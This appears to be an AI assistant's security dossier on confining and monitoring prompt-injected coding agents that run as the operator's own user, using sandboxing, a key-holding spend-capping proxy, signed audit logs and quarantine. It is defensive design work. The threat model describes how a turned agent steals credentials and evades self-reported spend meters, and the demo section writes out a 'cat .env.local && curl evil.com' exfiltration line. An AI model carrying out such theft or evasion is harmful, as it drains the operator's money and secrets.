I have all the grounding I need. The critical findings:

1. **`budget-guard.ts` is self-reported spend** — the agent "promises" spend (`estimatedSpendUsd`), and the ledger trusts what the agent reports. A malicious agent under-reports and the kill never arms. This is the central weakness for "bankrupt me."
2. `sandbox-exec` (Seatbelt) is available on macOS but unused.
3. No secret broker (`op`, `infisical`) installed.
4. ADR-0040 explicitly disclaims both the malicious operator and same-user-process threat — exactly this task's scope.

I now have everything to write a rigorous dossier. Here it is.

---

# L4 — The Coast Guard: Defending the Operator From Their Own Agents

**A same-machine threat-model dossier for Port Daddy**
*Scope: the adversary every prior layer explicitly excluded — a compromised, prompt-injected, or simply greedy agent running as the operator's own UID on the operator's own machine.*

---

## 0. Why this layer has to exist (and why nothing above it covers it)

Every existing PD security layer is built for a *cooperating* fleet under *one trusted operator*. The exclusions are written down, in code and in ADRs:

- **ADR-0040** (`docs/adr/0040-non-forgeable-actor-identity.md`, lines 76–79): *"Non-goal: cryptographic agent attestation against a malicious human operator. The threat model is a lazy/self-interested agent in a fleet the operator owns, not a hostile operator."*
- **`lib/ipc-auth.ts`** (lines 11–13): *"The IPC socket is chmod 0600 (owner-only), so any connection is already from the same user… same user = authenticated."*
- **`lib/keychain.ts`** (lines 11–14): *"UNIX file permissions are a boundary between users, not between processes of the same user."*
- The L0 security critique (lines 39, 51) names the gap precisely: `session_files` claims are **advisory coordination locks between cooperating agents, not OS-enforced filesystem isolation. A malicious agent ignores a `session_files` row and writes the file anyway.**

So PD's entire trust model collapses to a single assumption: **every process running as your UID is benign.** That assumption is exactly what a prompt-injected agent breaks. The agent *is* a process running as your UID, and an attacker who lands a payload in the agent's context (a poisoned web page, a malicious dependency README, a hostile issue comment the agent reads) now has all of your UID's authority. This is the *confused-deputy* problem (Hardy 1988) at machine scale: the agent is a deputy holding the operator's ambient authority, and the attacker borrows it.

The Coast Guard is the layer that says: **a process running as your UID is no longer automatically trusted. Authority is brokered, metered, attenuated, and logged — by construction, not by the agent's good behavior.**

---

## 1. Threat model (stated explicitly — the thing the prior layers never wrote down)

**Principal we protect:** the human operator (Erich), who is liable for every dollar, every secret, every `git push --force`, every API call the fleet makes under his name.

**Adversary:** an agent process running as the operator's UID that has been turned — by prompt injection, a poisoned tool result, a malicious skill/dependency, or a model that simply went off-rails. It has:
- full read of the filesystem the UID can read (so: `.env.local`, `~/.aws`, `~/.ssh`, `~/.claude.json`, the PD SQLite DB);
- the ability to spawn subprocesses (`bash`), make arbitrary network egress, and write any file the UID can write;
- knowledge of PD's own coordination surface (it can forge `session_files` rows, claim/release, assert any `project:stack:context` identity per ADR-0040's display-alias design).

**Adversary is NOT:** a different UID, the kernel, the OS keychain daemon, or a remote attacker without a foothold. We are not building a hypervisor or defending against root. We are defending against *our own deputy*.

### 1.1 STRIDE-shaped asset × harm × current control

| Asset | Harm | Current PD control | Real? |
|---|---|---|---|
| `.env.local`, `~/.aws`, API keys | Exfiltration → unlimited spend, account takeover | **None.** Any agent with `bash` reads them. | Theater |
| Daily API/compute $ | "Bankrupt me" | `budget-guard.ts` — **self-reported spend** (`estimatedSpendUsd` is agent-supplied) | Advisory only |
| Source tree, git history | `rm -rf`, force-push, secret-leak commit | `session_files` claims | **Advisory only** (L0 critique line 39) |
| Outbound network | Exfiltration, C2, crypto-mining | None | Theater |
| Harbor signing key | Forge cards as the daemon | keychain (macOS) / plaintext-DB fallback | Partial (macOS only) |
| Audit log | Cover tracks | Merkle chain, **nothing verifies it** | Theater vs. this adversary (L0 critique line 29) |

The honest reading: against the *same-UID* adversary, **PD currently has essentially zero hard controls.** Every "security" property degrades to "the agent chose not to." That is the whole problem statement.

### 1.2 The cleanest framing of the core trap

There is a fundamental impossibility that bounds this entire layer, and it must be stated up front so we don't sell theater: **a secret that a process can use, that process can also copy.** If the agent's own `bash` ever holds the raw OpenAI key in a variable, exfiltration is a single `curl`. Therefore the only *sound* defense is to **make sure the agent never holds the raw secret at all** — the secret lives in a separate trust domain (a broker) and the agent gets *use* without *possession*. Everything in §3 and §4 is an elaboration of that one move: **separate the authority-holder from the authority-user, and put a metering, attenuating, logging boundary between them.**

---

## 2. The two-front war: confinement (keep authority in) vs. attribution (make abuse loud)

There are exactly two families of defense and a serious product needs both:

- **Confinement** — *prevent* the bad action. OS sandboxing, secret brokers, egress proxies with hard caps. Strong but blunt and platform-coupled.
- **Attribution / detection** — *notice and attribute* the bad action fast enough to stop the bleeding. Signed audit logs, anomaly tripwires, quarantine. Weaker (post-hoc) but portable and composes with PD's existing append-only/Merkle organs.

PD today has a weak version of #2 (the Arbiter, post-commit, per L0 critique) and *nothing* of #1. The product opportunity is to build the **confinement primitives PD is missing** and *anchor them to PD's existing identity/audit spine* so the two fronts reinforce each other.

---

## 3. Confinement — what a local daemon can actually *enforce* vs. merely *advise*

This is the section where most "agent security" products are theater. The honest test: **if the agent ignores the control, does the control still hold?** If yes → enforcement. If no → advice.

### 3.1 OS sandboxing — the real enforcement primitives

| Mechanism | Platform | What it enforces | Can a *local PD daemon* invoke it? | Verdict for PD |
|---|---|---|---|---|
| **macOS Seatbelt** (`sandbox-exec` / `sandbox_init`) | macOS | FS read/write scope, network on/off, process exec, mach lookups via SBPL profile | **Yes** — `/usr/bin/sandbox-exec` is present (verified on this box). PD spawns the agent *inside* a generated profile. | **REAL, buildable now.** This is the single highest-leverage confinement primitive PD can ship on the dev platform. Deprecated-but-functional; Apple still ships it and Chrome/the App Sandbox use the same backend. |
| **Linux Landlock** (LSM, kernel ≥5.13) | Linux | Unprivileged, FS-path-scoped access rules; v4 (6.7) adds network port restriction | Yes — a small native helper applies a Landlock ruleset to the agent process before `execve`. | **REAL**, the correct modern Linux scoped-FS primitive (the one the L0 critique called for by name). Needs a tiny Rust/C shim. |
| **seccomp-bpf** | Linux | Syscall allow/deny filter | Yes, via shim | **REAL but blunt** — good for "no `socket()`, no `ptrace`," bad for fine-grained policy. Pair with Landlock, don't lead with it. |
| **OpenBSD `pledge`/`unveil`** | OpenBSD | Promise-based syscall classes + path-scoped FS | Only if the agent process cooperates (`pledge` is self-imposed) | Elegant but **self-imposed → not a control against a malicious agent** unless PD wraps a cooperating launcher. Niche platform; document, don't build. |
| **gVisor** | Linux | User-space kernel; strong syscall interposition | Yes, but heavyweight | **REAL, strong**, but it's a container-runtime adoption, not a daemon feature. The "enterprise tier" answer. |
| **microVM (Firecracker / Krun / Apple `Virtualization.framework`)** | Linux/macOS | Hardware-isolated VM per agent | Yes, heavyweight | **Strongest confinement that exists.** The honest top of the ladder. Cost: per-agent VM boot, filesystem plumbing, network plumbing. The "paranoid tier." |

**The enforcement ladder PD should articulate (and let the operator dial):**

```
advisory (today) → Seatbelt/Landlock profile → seccomp+Landlock → gVisor → microVM-per-agent
   weakest, free                                                              strongest, costly
```

**The honest line:** a local daemon can enforce *real* OS-level confinement **only by being the thing that spawns the agent** and wrapping the spawn in a sandbox profile. PD already owns the spawn path (`lib/spawner.ts`, `pd spawn`). That is the hook. PD cannot retroactively confine an agent the operator launched by hand outside PD — it can only *refuse to coordinate with* uncconfined agents (advisory) or *be the only sanctioned launcher* (enforcement). **The product decision is to make `pd spawn` the confined, sanctioned entry point and make raw `claude`/`bash` launches second-class.**

### 3.2 What confinement does NOT buy you

Sandboxing the *filesystem* and *exec* does not by itself stop **network exfiltration of a secret the agent legitimately needs.** If the agent is allowed to call `api.openai.com` (it must, to work) and it holds the key, it can also POST the key to `evil.com` by resolving `evil.com`'s IP and connecting to `api.openai.com`'s port — or just tunnel over the allowed connection. Network *on/off* is enforceable; network *semantic* policy ("you may talk to OpenAI but not exfiltrate the key") is **not** an OS-sandbox property. That is the egress-proxy's job (§4.2), and it only works if **the agent never holds the raw key** (§4.1).

---

## 4. The secret & spend problem — the heart of "bankrupt me," and the part PD can genuinely win

### 4.1 The `.env.local` god-mode problem and the broker pattern

**Current state:** every secret the UID can read is the agent's for the taking. `.env.local` is plaintext. This is not fixable with file permissions (same-UID). It is only fixable by **removing the raw secret from the agent's reach.**

**Landscape of mitigations (and their honest grade against the same-UID adversary):**

| Approach | What it does | Same-UID grade |
|---|---|---|
| **SOPS / age-encrypted `.env`** | Secrets encrypted at rest, decrypted to use | **Weak** — decryption key lives where the agent can reach it; once decrypted to env, it's exfiltratable. Helps against *git-leak*, not against *the agent*. |
| **1Password CLI (`op run`), Infisical, Vault Agent** | Inject secrets into a subprocess env at launch | **Weak-to-medium** — the secret still lands in the agent's environment/argv. Better than plaintext-on-disk (audit, rotation, no file), but `printenv` defeats it. Useful as the *broker's* backend, not as the agent's interface. |
| **Short-lived / dynamically-minted creds** (Vault dynamic secrets, STS `AssumeRole`, GitHub fine-grained PATs) | Credential expires in minutes and is scoped | **Medium** — shrinks the blast radius in *time* and *scope*. A stolen 15-min read-only token is far less catastrophic than a permanent admin key. Real and worth adopting, but the token is still *held* by the agent during its life. |
| **Proxy-mediated secrets — the agent never sees the key** | A local broker holds the key; the agent calls the broker (or a local egress proxy); the broker injects the real `Authorization` header on the outbound request and enforces per-agent policy/spend | **STRONG — this is the only design that survives the §1.2 impossibility.** The agent holds a *capability to make metered calls*, not the key itself. |

**The defensible product: PD ships a local secret broker + egress proxy ("the Cutter").**

```
  agent process            PD Cutter (separate trust domain)        upstream
  ─────────────            ─────────────────────────────────       ────────
  HTTP_PROXY=localhost ──► [ holds real keys in OS keychain ]
  no raw key in env        [ matches host → injects Authorization ]──► api.openai.com
  capability token  ──────►[ checks per-agent macaroon caveats   ]
                           [ meters $ against budget-guard ledger ]
                           [ appends signed audit-log entry       ]
                           [ HARD-STOPS at the cap                ]
```

The agent's environment contains **no API keys** — only `HTTP_PROXY`/`HTTPS_PROXY` pointing at the Cutter and a per-agent capability token. The Cutter is a separate process (separate trust domain; ideally itself Seatbelt-confined and *not* spawnable/killable by the agent). It is the only holder of the raw keys (in the OS keychain, reusing the *exact* `lib/keychain.ts` primitive PD already ships).

This is the move that makes "bankrupt me" *impossible by construction* rather than *discouraged by policy* — see §4.2.

### 4.2 Spend caps as a hard control (fixing `budget-guard.ts`'s fatal flaw)

**The bug today:** `lib/budget-guard.ts` is excellent *plumbing* — pre-flight `canSpawn()`, mid-flight throttle/kill thresholds, a `budget_ledger` SQLite table keyed `(project, agent_id, day)` — but its input is **self-reported.** The header literally warns about *"actors past the gate because they promised small spend."* The `estimatedSpendUsd` and the running total are whatever the agent (or the spawner trusting the agent) says. A malicious agent under-reports its spend and the `kill` never arms. **The meter is the thing the adversary controls.** That is the definition of a non-control.

**The fix:** move metering to the Cutter (§4.1), where it is *cryptographically attributable and not agent-controlled*:

1. Every outbound LLM/API call goes through the Cutter. The Cutter knows the *real* request (model, token count from the response, or a priced estimate from the request).
2. The Cutter debits the **same `budget_ledger`** keyed on the **ADR-0040 minted `actor_id`** (not the forgeable display string). The agent cannot under-report because **the agent is not the one reporting** — the proxy that saw the bytes is.
3. At the per-agent or per-day cap, the Cutter **returns 402 / drops the connection.** The cap is enforced at the *only point the money actually leaves*, so there is no path around it. "Bankrupt me" requires spending money; spending money requires the Cutter; the Cutter refuses past the cap. QED.
4. Each debit is an **append entry in a signed audit log** (§5.1), so spend is *attributable* to a specific actor and *non-repudiable*.

This is the single most important artifact in the whole layer: **it converts budget-guard from advice into a hard control by relocating the meter out of the adversary's reach.** It reuses budget-guard's ledger schema and keychain primitive — it's a *re-wiring*, not a greenfield build.

---

## 5. The cryptography — real vs. theater (rigorously)

The brief asks for rigor, not hand-waving. The discipline: a crypto control is **real** here only if it (a) defends against the *same-UID* adversary and (b) roots in a trust anchor the adversary *cannot reach*. The recurring failure mode is rooting a "crypto" control in a key the agent can read — that's theater.

### 5.1 REAL and buildable locally

- **Capability tokens / macaroons with caveats (Birgisson et al. 2014).** PD already mints Ed25519-signed JWT Harbor Cards (`lib/harbor-tokens.ts`, `hv:2`, `EdDSA`). The natural extension is **macaroons**: a bearer credential where the *holder* can attenuate it offline by appending HMAC-chained caveats (`spend < $5`, `host = api.openai.com`, `expires < T+15m`, `paths ⊆ /repo/foo`) but can never *broaden* it. This is the correct primitive for "give this subagent a strictly-weaker slice of my authority." **Real, and PD is 80% there** — it has signed tokens; it needs the caveat-chain attenuation and a Cutter that *checks* the caveats. The L0 critique's demand for an honest capability model (Miller's object-capabilities, *Robust Composition* 2006) is satisfied by macaroons done right: a capability you hold, attenuate, and delegate without phoning home.
  - *Honesty caveat:* a macaroon is a **bearer token** — whoever holds it wields it. Against a same-UID agent that can read another agent's token file, macaroons need the token to live in the **Cutter's** trust domain, not on disk where any agent reads it. So macaroons are real *only in combination with* the broker boundary.

- **Hardware-backed keys (Secure Enclave / TPM 2.0).** The daemon's / Cutter's *signing* key can be generated **non-extractable** in the macOS Secure Enclave (`SecKeyCreateRandomKey` with `kSecAttrTokenIDSecureEnclave`) or a TPM. The agent can *request signatures* but **can never copy the key** — it never exists in addressable memory. **REAL and high-value:** this is the difference between "the root-of-trust is a file the agent can steal" and "the root-of-trust is silicon the agent cannot exfiltrate." It directly upgrades the Harbor signing key and the audit-log signing key from "keychain file (same-UID readable on some configs)" to "hardware-bound." Buildable on this Mac today.

- **Signed, tamper-evident audit log / transparency log (Sigstore/Rekor lineage; Crosby–Wallach 2009 history trees; Haber–Stornetta 1991).** Every brokered action (secret use, spend debit, network egress, file write through a confined path) gets an **append-only, hash-chained, signed** entry. PD *already has* the Merkle/hash-chain organ (Anchor, `activity-log`). The fix the L0 critique demands (line 29: *"tamper-evidence that nothing verifies is not a security control, it is a data structure"*) is: **(a)** sign each entry with a Secure-Enclave key the agent can't forge, and **(b)** *verify* the chain on read and at quarantine time, and **(c)** optionally anchor the head to an external append-only sink (a file the agent's sandbox can't write, or a remote witness) so even log truncation is detectable. With the signing key in hardware, this becomes a **real** non-repudiation control: the agent cannot rewrite history because it cannot forge the signatures, and cannot truncate undetectably because the head is witnessed.

- **Short-lived attenuated credentials per agent.** Combine ADR-0040's minted identity + macaroon attenuation + a 15-minute TTL. Real, and the right default.

### 5.2 PARTIALLY real (real concept, weak locally)

- **Remote attestation of the agent binary.** TPM/Secure-Enclave *measured boot* attests the *OS and boot chain*, not "this Python process is running the agent code I think it is." There is **no robust way to attest the integrity of an interpreted, dynamically-composed LLM-agent process** against a same-UID attacker who can `LD_PRELOAD`, edit the script, or patch the interpreter. You can attest the *launcher binary* (PD's spawner) and have it measure a hash of the agent's entry script — useful as a tripwire, **not** a guarantee. **Grade: real for the launcher, theater for the agent's runtime behavior.** Don't oversell it.

- **Confidential-compute enclaves (SGX/SEV-SNP/TDX) for agent execution.** Genuinely strong *isolation from the host*, but (a) they protect the agent *from* the operator, which is the **opposite** of this threat model, and (b) LLM inference doesn't fit in an enclave. **Grade: wrong tool for this layer.** Mention only to dismiss.

### 5.3 THEATER (in this threat model)

- **MPC / threshold release of high-value secrets, all parties on one machine.** Threshold crypto assumes the share-holders are in *separate trust domains*. If every share sits on the same UID, the agent reconstructs all shares and the "threshold" is decorative. **Theater locally.** It becomes *real* only when the second share lives somewhere the agent can't reach — e.g. a *remote* co-signer or a hardware token requiring physical touch (which is just §5.1's hardware key with a human gate). The defensible residue of MPC here is **a human-in-the-loop approval gate for high-value secrets** (release the prod-DB credential only after the operator taps YubiKey / approves in FleetBar) — that's a *human gate*, not MPC, and we should call it what it is.

- **Any "encryption at rest" whose key the agent can read.** SOPS/age/sealed-`.env` where the decryption key is on the same UID. Defends against git-leak and a *different* user; **theater against the agent itself.**

- **Blockchain anything.** Not even tempting here; noted for completeness because agent-security marketing reaches for it. The audit log wants Certificate-Transparency-style *append-only + witnessed*, not consensus (this is exactly the L3 critique's correct posture).

### 5.4 The single sharpest crypto truth for this layer

> **The only cryptography that helps is the cryptography that moves the key out of the agent's address space.** Hardware-bound signing (Secure Enclave) + a broker in a separate trust domain (the Cutter) + attenuated capabilities (macaroons) the agent holds *instead of* the key. Everything else — encryption whose key the agent reads, MPC whose shares the agent holds, attestation of an interpreted process — is theater against the same-UID adversary. PD already ships two of the three ingredients (Ed25519 signing, keychain storage); the missing piece is the **trust-domain boundary** itself.

---

## 6. The "Coast Guard" — inspection & quarantine before exfiltration

Confinement (§3–4) is the hull. The Coast Guard is the patrol: **detect a turned agent and quarantine it before it exfiltrates**, accepting that detection is post-hoc and racing the exfil.

**What it inspects (all at the Cutter / spawn boundary, where PD has ground truth, not by parsing the agent's "intent"):**

- **Egress anomalies** at the Cutter: a new destination host the agent has never contacted; a POST body that contains bytes matching a known secret's fingerprint (the Cutter *knows* the real keys, so it can detect a key trying to leave — this is **canary/honeytoken detection**, a real and cheap control); a burst of requests (spend velocity) exceeding the agent's historical envelope.
- **Filesystem tripwires** via the sandbox: an agent that suddenly tries to read `~/.ssh`, `~/.aws`, or another project's `.env` when its task scope is `port-daddy` — the Seatbelt/Landlock profile *denies* it (enforcement) *and* logs it (signal).
- **Behavioral envelope, not keyword lists.** Per the operator's standing rule (no keyword NLP), detection uses the *structured* signals PD owns — destination hosts, spend rate, file-access patterns, capability-caveat violations — and, where free-text judgment is needed (e.g. "is this tool call suspicious"), a single cheap Haiku classifier call, not a substring denylist. The structured tripwires are the load-bearing detectors; the LLM judge is a tie-breaker.

**Quarantine actions (escalating, all enforceable because PD owns the boundary):**

1. **Throttle** — Cutter slows the agent's egress (reuses budget-guard's throttle signal).
2. **Freeze** — Cutter holds all the agent's outbound calls pending operator approval (FleetBar notification → human gate). The agent keeps running locally but **cannot act on the outside world.** This is the key insight: you don't have to *kill* the agent to *contain* it; you sever its outbound authority and let the human adjudicate.
3. **Kill + bond-slash** — terminate the process (PD owns the spawn → owns the kill, `spawner.terminate`), slash its bond (`lib/bonds.ts`), mark the `actor_id` (ADR-0040) sanctioned so a respawn starts at the newcomer floor.
4. **Forensic seal** — sign and externally-anchor the agent's audit-log segment so the incident is non-repudiable.

The Coast Guard is, in Schneider's (2000) terms, an **execution monitor in detect-and-recover mode** — and the L0 critique's hammer applies: *a post-hoc monitor enforces no safety property.* That is **fine here as long as it sits behind the confinement layer.** The honest architecture is: **Seatbelt/Landlock + the Cutter are the safety properties (truncate-before-bad-state, enforced); the Coast Guard is the liveness/alerting layer on top.** We do not sell the Coast Guard as prevention. We sell it as *fast attribution and containment of whatever slips the hull.*

---

## 7. The defensible product

**One sentence:** *PD becomes the sanctioned, confined launcher for agents and the broker for all their authority — so that a turned agent runs inside a sandbox, holds no raw secrets, spends through a hard-capped metered proxy, and leaves a signed trail, by construction rather than by good behavior.*

**Three pillars, mapped to what PD already owns:**

| Pillar | New surface | Reuses |
|---|---|---|
| **Confined spawn** | `pd spawn --sandbox` generates a Seatbelt (macOS) / Landlock (Linux) profile scoped to the agent's claimed `session_files` + declared egress | `lib/spawner.ts`, `session_files` claims (promotes advisory → enforced) |
| **The Cutter** (broker + egress proxy) | new daemon process: holds keys in keychain, injects auth headers, meters spend to budget-guard, enforces macaroon caveats, signs audit entries | `lib/keychain.ts`, `lib/budget-guard.ts` ledger, `lib/harbor-tokens.ts` Ed25519, ADR-0040 `actor_id` |
| **Coast Guard** | egress/FS/spend tripwires + escalating quarantine; FleetBar human-gate UI | Arbiter subscriber pattern, `lib/bonds.ts` slash, activity log, Secure-Enclave signing |

**This is positioned as the answer to the exact exclusion every prior layer wrote down** — it earns a clean ADR ("ADR-00xx: same-machine agent confinement; extends ADR-0040's threat model to the turned agent") rather than contradicting one.

---

## 8. The concrete minimal first artifact

**Build the Cutter's narrowest useful slice: a local egress proxy that brokers exactly one secret class (LLM API keys) and enforces a hard, non-agent-controlled spend cap.** Call it `pd cutter`.

**MVP scope (one to two weeks, all real, no greenfield crypto):**

1. **A localhost HTTP/HTTPS forward proxy** (TLS-terminating via a locally-trusted CA the agent's sandbox trusts, or a CONNECT proxy that injects headers for known hosts). Holds the real `OPENAI_API_KEY` / `ANTHROPIC_API_KEY` in `lib/keychain.ts` — **never in the agent's env.**
2. **Header injection** for known LLM hosts: strips/ignores any client auth, injects the real key from keychain.
3. **Hard spend metering** into the existing `budget_ledger`, keyed on a per-agent token the proxy maps to an ADR-0040 `actor_id`. Priced from request/response token counts the *proxy* observes — **not** agent-reported. At the per-agent or daily cap → **HTTP 402 + connection drop.** This is the "bankrupt me becomes impossible" demo.
4. **Signed append-only audit line** per call (`actor_id`, host, model, tokens, $, timestamp, prev-hash), signed with a key generated in the Secure Enclave (or keychain as fallback), verifiable by `pd cutter verify`.
5. **One canary tripwire:** if a request body contains the fingerprint of a known stored secret, **block + alarm** (honeytoken exfil detection).
6. **`pd spawn` wires it up:** launches the agent with `HTTPS_PROXY=localhost:<port>`, **no API keys in env**, plus a Seatbelt profile (macOS) denying reads of `~/.ssh`, `~/.aws`, and other projects' `.env*`.

**The demo that sells it:** run a deliberately-injected agent that tries to (a) `cat .env.local && curl evil.com` → **sandbox denies the read**; (b) burn $1000 of API calls → **Cutter 402s at the cap**; (c) POST the OpenAI key to a webhook → **canary tripwire blocks it**; then show `pd cutter verify` proving the signed, hash-chained record of every attempt. Three concrete "your own agent tried to hurt you and couldn't" moments, each rooted in a primitive PD already has.

**Explicitly deferred (and labeled, not stubbed):** full macaroon caveat chains, Landlock shim for Linux, microVM tier, MPC/human-gate for high-value secrets, remote witness for the audit head. These are the roadmap *after* the Cutter proves the trust-domain boundary works.

---

## 9. The one-paragraph honest verdict

PD has been built, deliberately and correctly, for a *trusting* single-operator fleet — and every layer says so in writing. The same-machine adversary is real (prompt injection turns your own deputy against you) and PD's current controls against it are essentially all advisory: self-reported spend, advisory file-claims, plaintext `.env`, an audit log nothing verifies. The good news is that the *defensible* version of this layer reuses almost everything PD already shipped — Ed25519 signing, the keychain primitive, the budget ledger, the minted identity, the hash-chain — and adds exactly **one new architectural idea: a trust-domain boundary (the Cutter) between the authority-holder and the authority-user.** The crypto that's real is the crypto that moves the key out of the agent's reach (hardware-bound signing + broker + attenuated capabilities); everything whose key the agent can read, and all on-one-machine MPC/attestation, is theater against this adversary. Ship the Cutter's spend-cap slice first: it is the smallest artifact that makes "bankrupt me" impossible by construction, and it is a demo, not a deck.

---

**Files grounding this dossier (all absolute):**
- `/Users/erichowens/coding/port-daddy/docs/adr/0040-non-forgeable-actor-identity.md` (lines 76–79: the explicit threat-model exclusion this layer fills)
- `/Users/erichowens/coding/port-daddy/lib/ipc-auth.ts` (lines 11–13, 49–57: "same user = authenticated" — the collapsed trust model)
- `/Users/erichowens/coding/port-daddy/lib/keychain.ts` (the secret-storage primitive the Cutter reuses; line 12–14 states the same-UID boundary problem)
- `/Users/erichowens/coding/port-daddy/lib/harbor-tokens.ts` (lines 18–24, 70–81: Ed25519/JWT signing PD already ships → macaroon extension)
- `/Users/erichowens/coding/port-daddy/lib/budget-guard.ts` (lines 22, 63: self-reported spend — the fatal flaw the Cutter fixes)
- `/Users/erichowens/coding/port-daddy/lib/bonds.ts`, `/Users/erichowens/coding/port-daddy/lib/spawner.ts` (slash + spawn hooks for quarantine)
- `/Users/erichowens/coding/tmp/pd-papers/docs/research/north-star/layers/L0-critique-security.md` (lines 29, 39, 51: advisory-claims-aren't-sandboxing; tamper-evidence nothing-verifies; Schneider post-hoc)
- `/Users/erichowens/coding/tmp/pd-papers/docs/research/north-star/layers/L3-critique-crypto-identity.md` (CT-not-blockchain posture; Sybil/identity-keystone)
- `sandbox-exec` confirmed present at `/usr/bin/sandbox-exec`; no `op`/`infisical` installed (broker must be PD-native)."